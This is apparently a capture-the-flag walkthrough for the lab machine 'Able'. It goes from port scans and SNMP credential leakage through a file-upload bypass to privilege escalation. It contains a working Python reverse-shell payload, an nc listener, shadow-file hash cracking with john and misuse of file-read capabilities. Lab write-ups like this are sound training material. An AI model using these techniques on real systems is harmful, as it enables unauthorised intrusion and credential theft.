# Able writeups by Seyptoo.

Scan TCP
----

Let's start by doing a port scan.

    root@Seyptoo:~/htb/wizard/box/Able# nmap -sT -p 1-65535 -oA nmap/able 192.168.0.21

    Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-23 20:19 CEST
    Nmap scan report for 192.168.0.21
    Host is up (0.0016s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 08:00:27:16:E2:52 (Oracle VirtualBox virtual NIC)

    Nmap done: 1 IP address (1 host up) scanned in 3.22 seconds
    root@Seyptoo:~/htb/wizard/box/Able# nmap -sT -p22,80 -sC -sV -oA nmap/able 192.168.0.21

    Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-23 20:20 CEST
    Nmap scan report for 192.168.0.21
    Host is up (0.00049s latency).
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 47:2c:be:2f:88:6f:21:72:ff:a3:0b:3d:12:f0:25:72 (RSA)
    |_  256 a3:ab:98:7a:f4:d0:54:17:13:3a:05:7e:53:e6:bc:18 (ECDSA)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    MAC Address: 08:00:27:16:E2:52 (Oracle VirtualBox virtual NIC)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
    
As you can see, there are two open ports ssh and http.

Scan UDP
----

We will also do a UDP scan on the server. As you can see below there is the SNMP protocol that is open, and public so we can enumerate afterwards.

    root@Seyptoo:~/htb/wizard/box/Able# nmap -sU -oA -sC -sV nmap/udp 192.168.0.21 --min-rate 10000
    Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-23 20:25 CEST
    Nmap scan report for 192.168.0.21
    Host is up (0.0011s latency).
    PORT    STATE SERVICE VERSION
    161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
    | snmp-hh3c-logins: 
    |_  baseoid: 1.3.6.1.4.1.25506.2.12.1.1.1
    | snmp-info: 
    |   enterprise: net-snmp
    |   engineIDFormat: unknown
    |   engineIDData: 6c5ddc433219bf5c00000000
    |   snmpEngineBoots: 11
    |_  snmpEngineTime: 19m20s
    | snmp-sysdescr: Linux Able 4.15.0-47-generic #50-Ubuntu SMP Wed Mar 13 10:44:52 UTC 2019 x86_64
    |_  System uptime: 19m21.44s (116144 timeticks)
    MAC Address: 08:00:27:16:E2:52 (Oracle VirtualBox virtual NIC)
    Service Info: Host: Able

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds

HTTP
----
On the HTTP server it is a connection form so currently I have no information on the identifiers to connect.

[![forthebadge made-with-python](
https://image.noelshack.com/fichiers/2019/17/2/1556044461-capture-du-2019-04-23-20-34-07.png)](
https://image.noelshack.com/fichiers/2019/17/2/1556044461-capture-du-2019-04-23-20-34-07.png)

So let's try to enumerate the SNMP protocol to gain access.

SNMP Enumeration
----
    root@Seyptoo:/var/www/html# snmpwalk -c public -v1 192.168.0.21
    [...SNIP...]
    iso.3.6.1.2.1.1.6.0 = STRING: "HTTP Credentials : admin:P3ssW0rdCr3ck3d!@:;"
    iso.3.6.1.2.1.1.7.0 = INTEGER: 72
    iso.3.6.1.2.1.1.8.0 = Timeticks: (116) 0:00:01.16
    iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
    [...SNIP...]
    
As you can see above, we managed to find the credentials to log on to the admin page.

HTTP Connect
----
[![forthebadge made-with-python](
https://image.noelshack.com/fichiers/2019/17/2/1556044762-capture-du-2019-04-23-20-39-12.png)](
https://image.noelshack.com/fichiers/2019/17/2/1556044762-capture-du-2019-04-23-20-39-12.png)

Once connected, you can access the path for upload file and try to enumerate on this path and see if we can put any file and testing. When I try to import a PHP file, unfortunately I do not have the permissions.

[![forthebadge made-with-python](
https://image.noelshack.com/fichiers/2019/17/2/1556045157-capture-du-2019-04-23-20-45-31.png)](
https://image.noelshack.com/fichiers/2019/17/2/1556045157-capture-du-2019-04-23-20-45-31.png)

Since I do not have access, I decided to create my own extension list and test with burp suite.

    root@Seyptoo:/home/seyptoo# cat list.ext 
    jpg
    php
    php5
    php7
    png
    rb
    py
    config
    xml
    asp
    aspx
    
This is my list for the attack.

[![forthebadge made-with-python](
https://image.noelshack.com/fichiers/2019/17/2/1556045685-capture-du-2019-04-23-20-52-01.png)](
https://image.noelshack.com/fichiers/2019/17/2/1556045685-capture-du-2019-04-23-20-52-01.png)

So I start preparing my attack to find the right extension to then put my file, so as you can see below the python extension is allowed.

[![forthebadge made-with-python](
https://image.noelshack.com/fichiers/2019/17/2/1556045858-capture-du-2019-04-23-20-54-10.png)](
https://image.noelshack.com/fichiers/2019/17/2/1556045858-capture-du-2019-04-23-20-54-10.png)

concretely this machine contains the system of automatic execution thanks to the crontab, suddenly the machine executes the python files every minute. So I'm going to create my payload, to do my reverse shell.

Payload :

    import socket
    import subprocess
    import os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.21",9002))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);

Once imported on the server, a minute later I have a shell that appears.

    root@Seyptoo:/home/seyptoo# nc -lvnp 9002
    Listening on [0.0.0.0] (family 0, port 9002)
    Connection from [192.168.0.21] port 9002 [tcp/*] accepted (family 2, sport 46602)
    /bin/sh: 0: can't access tty; job control turned off
    $ python3 -c "import pty;pty.spawn('/bin/bash')"
    www-data@Able:~$ 
    
Perfect, we managed to do a reverse shell without any error. There is a folder /backup try to enumerate that.

    www-data@Able:/backups$ cat shadow.backup
    [...SNIP...]
    roberto:$6$9mLCnYKx$0oszmyGRlVCE.2c/kI8jOsElKYqt8gdap8dpdPMI5Ks59uK20IZ7jGCIUPB/ePvvbCWOQmo4P2PesqlSp/ina1:18009:0:99999:7:::
    Debian-snmp:!:18009:0:99999:7:::
    james:$6$EFhM/jBS$1s59wKFIirpJoSymC8AsdfsuhJJYqx06lN8sDBaEAgeyFUYBxO5hr/XUzzknPj4k6cxAOl4xAA36ed4Rs25Yh/:18009:0:99999:7:::
    
Let's try cracking passwords with john. 
   
    root@Seyptoo:~/htb# john --wordlist=/home/seyptoo/Téléchargements/rockyou.txt password.hash
    [...SNIP..]
    root@Seyptoo:~/htb# john --show password.hash
    $6$9mLCnYKx$0oszmyGRlVCE.2c/kI8jOsElKYqt8gdap8dpdPMI5Ks59uK20IZ7jGCIUPB/ePvvbCWOQmo4P2PesqlSp/ina1:18009:0:99999:7::: > jessica1
    $6$EFhM/jBS$1s59wKFIirpJoSymC8AsdfsuhJJYqx06lN8sDBaEAgeyFUYBxO5hr/XUzzknPj4k6cxAOl4xAA36ed4Rs25Yh/:18009:0:99999:7::: > password
    
Let's try to connect with the su command.

    www-data@Able:/backups$ su - roberto 
    su - roberto
    Password: jessica1

    roberto@Able:~$ cat user.txt
    518494452b3a78aefd99c71b1faa6395

Perfect we are user, now let's go to privesc.

PrivEsc
----
There is the capacity system set up on the machine, so let's do a simple search with getcap.

    roberto@Able:~$ getcap -r / 2>/dev/null
    /usr/src/linux-headers-4.15.0-47/ubuntu/emergency1 = cap_dac_read_search+ep
    /usr/src/linux-headers-4.15.0-47/ubuntu/emergency = cap_dac_read_search+ep
    /usr/bin/mtr-packet = cap_net_raw+ep

As you can see there are two rather specific files, let's see that more closely. With the emergency file, we can list what's in the folder so let's try to list the /root folder.

    roberto@Able:/usr/src/linux-headers-4.15.0-47/ubuntu$ ./emergency -alv /root
    total 60
    drwx------  4 root root  4096 Apr 23 18:33 .
    drwxr-xr-x 24 root root  4096 Apr 23 16:33 ..
    -rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
    -rw-------  1 root root  8714 Apr 23 18:05 .bash_history
    -rw-------  1 root root    35 Apr 23 18:33 .lesshst
    drwxr-xr-x  3 root root  4096 Apr 23 15:47 .local
    -rw-r--r--  1 root root   148 Aug 17  2015 .profile
    -rw-r--r--  1 root root    66 Apr 23 15:47 .selected_editor
    drwx------  2 root root  4096 Apr 23 17:31 .ssh
    -rw-------  1 root root 10617 Apr 23 18:30 .viminfo
    -rw-r--r--  1 root root    33 Apr 23 17:12 root.txt

We can list the folder /root, now let's try to read the file root.txt with the file emergency1.

    roberto@Able:/usr/src/linux-headers-4.15.0-47/ubuntu$ ./emergency1 /root/root.txt
    6abba532a54c9eb9aa30496fa7f2273d





